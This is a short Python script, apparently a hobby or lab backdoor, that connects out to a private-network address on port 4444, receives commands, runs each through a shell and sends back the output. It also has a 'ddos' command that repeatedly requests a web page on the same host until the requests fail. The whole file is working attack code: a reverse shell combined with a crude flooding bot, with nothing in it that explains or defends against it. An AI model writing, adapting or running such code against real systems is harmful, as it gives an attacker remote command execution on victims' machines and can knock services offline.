

import socket
import subprocess
from urllib import request

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection.connect(("192.168.100.162", 4444))

def execute_command(command):
    return subprocess.check_output(command, shell=True)




#connection.send("\n [+] connection stablished \n".encode())

def execute_ddos(command):
    while True:
        try:
            response = request.urlopen("http://192.168.100.162:8000")
            connection.send("Send request to page".encode())
        except Exception as e:
            connection.send("finish".encode())
            break




while True:
    command = connection.recv(1024)
    command = command.decode()
    if command == "ddos":
        execute_ddos(command)
    else:
        command_res = execute_command(command)
        connection.send(command_res)

connection.close()
